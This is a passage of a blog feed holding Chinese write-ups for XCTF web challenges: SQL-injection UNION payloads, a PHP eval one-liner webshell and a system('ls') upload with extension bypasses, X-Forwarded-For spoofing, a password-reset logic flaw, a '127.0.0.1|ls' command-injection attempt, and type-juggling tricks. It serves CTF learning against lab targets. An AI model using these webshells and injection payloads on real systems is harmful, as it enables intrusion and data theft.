      &lt;h2 id=&quot;src-攻防世界-ics-04&quot;&gt;&lt;a href=&quot;#src-攻防世界-ics-04&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ics-04&quot;&gt;&lt;/a&gt;[src = 攻防世界] ics-04&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
    
      <category term="逻辑错误" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>http-header</title>
    <link href="http://yoursite.com/2019/11/18/http-header/"/>
    <id>http://yoursite.com/2019/11/18/http-header/</id>
    <published>2019-11-18T10:17:17.000Z</published>
    <updated>2019-11-21T05:44:57.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改HTTP头的方法"><a href="#修改HTTP头的方法" class="headerlink" title="修改HTTP头的方法"></a>修改HTTP头的方法</h2><ol><li>使用浏览器插件，比如Firefox的Tamper Data。如图：</li></ol><p><img src="./httpheader1.PNG" alt="http-head"></p><ol start="2"><li>CURL（KALI内置）添加修改头部信息，比如添加文件头：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -H 'referer: https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>添加Referrer头可以直接使用-e参数，所以上面的命令可以等同于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -H 'x-Forwarded-For: 123.123.123.123' -e 'https://www.google.com' http://111.198.29.45/</span></span><br></pre></td></tr></table></figure><p>关于CURL使用参考：<a href="https://catonmat.net/cookbooks/curl" target="_blank" rel="noopener">https://catonmat.net/cookbooks/curl</a></p><ol start="3"><li>基于Burp抓包修改：</li></ol><p><img src="./httpheader2.PNG" alt="http-head"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;修改HTTP头的方法&quot;&gt;&lt;a href=&quot;#修改HTTP头的方法&quot; class=&quot;headerlink&quot; title=&quot;修改HTTP头的方法&quot;&gt;&lt;/a&gt;修改HTTP头的方法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用浏览器插件，比如Firefox的Tamper Data。如图
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
      <category term="HEADER" scheme="http://yoursite.com/tags/HEADER/"/>
    
  </entry>
  
  <entry>
    <title>bug</title>
    <link href="http://yoursite.com/2019/11/18/bug/"/>
    <id>http://yoursite.com/2019/11/18/bug/</id>
    <published>2019-11-18T01:23:02.000Z</published>
    <updated>2019-11-18T02:43:31.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-bug"><a href="#src-攻防世界-bug" class="headerlink" title="[src = 攻防世界] bug"></a>[src = 攻防世界] bug</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入弹窗提示“Please Login！”，然后显示登陆框。随便注册一个账号。如图：</p><p><img src="./bug1.PNG" alt="bug"></p><p>然后登录成功。但没有发现大的问题。重点关注首页对Findpwd功能，因为密码修改对逻辑错误经常导致安全问题，因此对修改密码过程进行抓包，如下图：</p><p><img src="./bug2.PNG" alt="bug"></p><p>点击reset后，进入burp抓包界面，如下图：</p><p><img src="./bug3.PNG" alt="bug"></p><p>将其中的username修改为admin，然后forward。发现密码修改成功。如图，基于admin账号登录成功。</p><p><img src="./bug4.PNG" alt="bug"></p><p>点击manage页面，但是页面显示“IP Not allowed！”。这应该是只允许在内网才能访问管理页面，现在是外网，该功能不能使用，因此通过修改X-Forwarded-For头为127.0.0.1，来欺骗系统，进入管理页面。显示</p><p><img src="./bug5.PNG" alt="bug"></p><p>查看源文件，发现页面对注释中包含：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></span><br></pre></td></tr></table></figure><p>访问该网页：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:55218/index.php?module=filemanage&amp;do=upload</span><br></pre></td></tr></table></figure><p>发现文件上传页面，如图：</p><p><img src="./bug6.PNG" alt="bug"></p><p>提示只能上次image，上传下面的php代码（这是文件内容绕过，所以不能使用”&lt;?php ?&gt;”）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>system('ls');<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包后修改后缀为php5（php4也可以，但是直接修改为php不允许）。</p><p><img src="./bug7.PNG" alt="bug"></p><p>弹窗得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-bug&quot;&gt;&lt;a href=&quot;#src-攻防世界-bug&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] bug&quot;&gt;&lt;/a&gt;[src = 攻防世界] bug&lt;/h2&gt;&lt;h3 id=&quot;WP&quot;&gt;&lt;a href=&quot;#WP&quot;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="逻辑错误" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>upload1</title>
    <link href="http://yoursite.com/2019/11/17/upload1/"/>
    <id>http://yoursite.com/2019/11/17/upload1/</id>
    <published>2019-11-17T03:21:43.000Z</published>
    <updated>2019-11-18T13:21:19.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-upload1"><a href="#src-攻防世界-upload1" class="headerlink" title="[src = 攻防世界] upload1"></a>[src = 攻防世界] upload1</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>明显的文件上传漏洞。本题是基于js的前段校验。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">upfile = <span class="built_in">document</span>.getElementById(<span class="string">"upfile"</span>);</span><br><span class="line">submit = <span class="built_in">document</span>.getElementById(<span class="string">"submit"</span>);</span><br><span class="line">name = upfile.value;</span><br><span class="line">ext = name.replace(<span class="regexp">/^.+\./</span>,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'jpg'</span>,<span class="string">'png'</span>].contains(ext))&#123;</span><br><span class="line">    submit.disabled = <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    submit.disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    alert(<span class="string">'请选择一张图片文件上传!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许jpg和png格式，但是我们知道前段校验可以非常容易对绕过。我们首先写一个一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'bitsec'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将文件后缀改为jpg，然后设置代理，通过burp进行抓包，如图</p><p><img src="./upload11.PNG" alt="upload1"></p><p>将其中的后缀改为php，然后forward即可上传成功，如图。</p><p><img src="./upload12.PNG" alt="upload1"></p><p>页面回显：upload success : upload/1573961293.123.php </p><p>通过中国菜刀等webshell工具连接成功，如图：</p><p><img src="./upload13.PNG" alt="upload1"></p><p>访问目录，发现flag.php文件，打开就得到flag：</p><p><img src="./upload14.PNG" alt="upload1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-upload1&quot;&gt;&lt;a href=&quot;#src-攻防世界-upload1&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] upload1&quot;&gt;&lt;/a&gt;[src = 攻防世界] upload1&lt;/h2&gt;&lt;h3 id=&quot;W
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="一句话木马" scheme="http://yoursite.com/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>PHP2</title>
    <link href="http://yoursite.com/2019/11/17/PHP2/"/>
    <id>http://yoursite.com/2019/11/17/PHP2/</id>
    <published>2019-11-17T02:55:46.000Z</published>
    <updated>2019-11-18T13:21:19.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-PHP2"><a href="#src-攻防世界-PHP2" class="headerlink" title="[src = 攻防世界] PHP2"></a>[src = 攻防世界] PHP2</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>熟悉php的应该知道phps文件可以用来读取php代码，这里就是可以看到此问题导致对源码泄露，直接访问index.phps，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>需要满足两个条件：<br>第一步，要使得”admin”===$_GET[id]不成立</p><p>第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。</p><p>看似矛盾，关键在理解urldecode函数的行为，其解释为解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符。</p><p>因为当将URL传递给$_GET[id]时，会进行第一次url解码，这时要求不能解码得到admin，然后再次交给urldecode进行url解码，这次要得到admin。<br>所以构造下面对payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2561</span>dmin</span><br></pre></td></tr></table></figure><p>第一次url解码得到（将%25解码成%）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">61</span>dmin</span><br></pre></td></tr></table></figure><p>此时满足了第一步的条件。然后第二次交给urldecode函数，这次将%61解码成字符a，变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=admin</span><br></pre></td></tr></table></figure><p>满足第二步条件，得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-PHP2&quot;&gt;&lt;a href=&quot;#src-攻防世界-PHP2&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] PHP2&quot;&gt;&lt;/a&gt;[src = 攻防世界] PHP2&lt;/h2&gt;&lt;h3 id=&quot;WP&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="信息泄露" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="URL编码与解码" scheme="http://yoursite.com/tags/URL%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Training-WWW-Robots</title>
    <link href="http://yoursite.com/2019/11/17/Training-WWW-Robots/"/>
    <id>http://yoursite.com/2019/11/17/Training-WWW-Robots/</id>
    <published>2019-11-17T02:41:23.000Z</published>
    <updated>2019-11-17T02:44:09.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-Training-WWW-Robots"><a href="#src-攻防世界-Training-WWW-Robots" class="headerlink" title="[src = 攻防世界] Training-WWW-Robots"></a>[src = 攻防世界] Training-WWW-Robots</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>都提示Robots了，直接访问：<br>&lt;网址&gt;/robots.txt<br>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure><p>然后访问/fl0g.php得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-Training-WWW-Robots&quot;&gt;&lt;a href=&quot;#src-攻防世界-Training-WWW-Robots&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] Training-WWW-Robots&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="robots" scheme="http://yoursite.com/tags/robots/"/>
    
  </entry>
  
  <entry>
    <title>lottery</title>
    <link href="http://yoursite.com/2019/11/16/lottery/"/>
    <id>http://yoursite.com/2019/11/16/lottery/</id>
    <published>2019-11-16T04:48:50.000Z</published>
    <updated>2019-11-18T13:21:19.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-lottery"><a href="#src-攻防世界-lottery" class="headerlink" title="[src = 攻防世界] lottery"></a>[src = 攻防世界] lottery</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3> <a id="more"></a><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开界面我们知道，要拿到flag，就要赢到足够的钱，其实一开始我以为可以找到一个地方直接修改余额什么的，把网页源代码中的文件看了几个都没发现突破口……</p><p>尝试了一下robots.txt，想看看有没有什么文件，然后发现了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure><p>应该是git源码泄露，下载GitHack（<a href="https://github.com/lijiejie/GitHack）" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack）</a>，并进行源码下载。（其实本题还提供了源码附件，直接下载就可以了）</p><p>发现在源码api.php中买彩票对关键代码：</p><p><img src="./lottery2.PNG" alt="lottery"></p><p>可以看到$numbers 来自用户json输入 {“action”:”buy”,”numbers”:”1122334”}，没有检查数据类型。 $win_numbers 是随机生成的数字字符串。</p><p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等。 由于 json 支持布尔型数据，因此可以抓包改包，构造数据：</p><p>原来数据包为：</p><p><img src="./lottery3.PNG" alt="lottery"></p><p>修改后为：</p><p><img src="./lottery4.PNG" alt="lottery"></p><p>经过2-3次对购买彩票，就可以达到购买flag的余额。直接购买就得到flag：</p><p><img src="./lottery5.PNG" alt="lottery"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-lottery&quot;&gt;&lt;a href=&quot;#src-攻防世界-lottery&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] lottery&quot;&gt;&lt;/a&gt;[src = 攻防世界] lottery&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="源码泄露" scheme="http://yoursite.com/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>isc-06</title>
    <link href="http://yoursite.com/2019/11/16/isc-06/"/>
    <id>http://yoursite.com/2019/11/16/isc-06/</id>
    <published>2019-11-16T04:28:25.000Z</published>
    <updated>2019-11-16T05:09:01.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-isc-06"><a href="#src-攻防世界-isc-06" class="headerlink" title="[src = 攻防世界] isc-06"></a>[src = 攻防世界] isc-06</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>进入题目，发现只有报表中心可以打开，发现一个列表页面。URL中有?id=1。可能是SQL注入。但测试发现不是。题目提示数据被删除，但留下了一点痕迹。所以考虑id为某个值对数据被保留，其他被删除了。所以考虑爆破id字段。</p><p>用Burp抓包，并对id字段进行爆破，讲payload type设置为Numbers，如图：</p><p><img src="./isc1.PNG" alt="isc"></p><p>爆破到id=2333时得到flag。</p><p><img src="./isc2.PNG" alt="isc"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-isc-06&quot;&gt;&lt;a href=&quot;#src-攻防世界-isc-06&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] isc-06&quot;&gt;&lt;/a&gt;[src = 攻防世界] isc-06&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="爆破" scheme="http://yoursite.com/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>cat</title>
    <link href="http://yoursite.com/2019/11/16/cat/"/>
    <id>http://yoursite.com/2019/11/16/cat/</id>
    <published>2019-11-16T03:43:40.000Z</published>
    <updated>2019-11-18T13:21:19.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-cat"><a href="#src-攻防世界-cat" class="headerlink" title="[src = 攻防世界] cat"></a>[src = 攻防世界] cat</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>抓住那只猫<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>首先按照题目要求，输入一个任意域名，发现没有反应，输入一个IP地址，显示了PING命令对结果。初步考虑命令执行。<br>输入“127.0.0.1|ls”，提示“Invalid URL”，看来增加了过滤，直接执行命令不可行。</p><p>在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=w，看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><p>在报错信息里面发现这个应用的整体架构：我们给php发出请求，php把请求发送给本地部署的django，然后得到结果。而且从报错页面发现了database信息：/opt/api/database.sqlite3</p><p>由于django本地部署，而且php使用的cURL组件，所以这里，我们使用前面讲的php的cURL文件上传，但需要以@开头。</p><p><img src="./cat1.png" alt="cat"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>然后在报错也没搜索CTF得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-cat&quot;&gt;&lt;a href=&quot;#src-攻防世界-cat&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] cat&quot;&gt;&lt;/a&gt;[src = 攻防世界] cat&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;抓住那只猫&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="编码" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>NewsCenter</title>
    <link href="http://yoursite.com/2019/11/16/NewsCenter/"/>
    <id>http://yoursite.com/2019/11/16/NewsCenter/</id>
    <published>2019-11-16T03:21:02.000Z</published>
    <updated>2019-11-16T03:33:03.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-NewsCenter"><a href="#src-攻防世界-NewsCenter" class="headerlink" title="[src = 攻防世界] NewsCenter"></a>[src = 攻防世界] NewsCenter</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题目环境报错，稍等片刻刷新即可<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目显示一个Search news，随便输入几个数字会发现下面的显示结果变化。输入“1’”程序报错，所以基本确认存在SQLi。下面利用Union查询，测试显示对列数。<br>输入payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111<span class="string">' union select 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>显示如下：</p><p><img src="./newscenter1.PNG" alt="newcenter"></p><p>发现有三列，并输出第二列和第三列。则可以利用这两列获取数据库信息，payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</span></span><br></pre></td></tr></table></figure><p>在最下面发现secret_table。然后表内信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111<span class="string">' union select 1,column_name,data_type from information_schema.columns where table_name='</span>secret_table<span class="string">'#</span></span><br></pre></td></tr></table></figure><p>发现一个fl4g字段。然后显示该字段得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,2,fl4g from secret_table #</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-NewsCenter&quot;&gt;&lt;a href=&quot;#src-攻防世界-NewsCenter&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] NewsCenter&quot;&gt;&lt;/a&gt;[src = 攻防世界] NewsCenter&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;如题目环境报错，稍等片刻刷新即可&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
    
  </entry>
  
</feed>
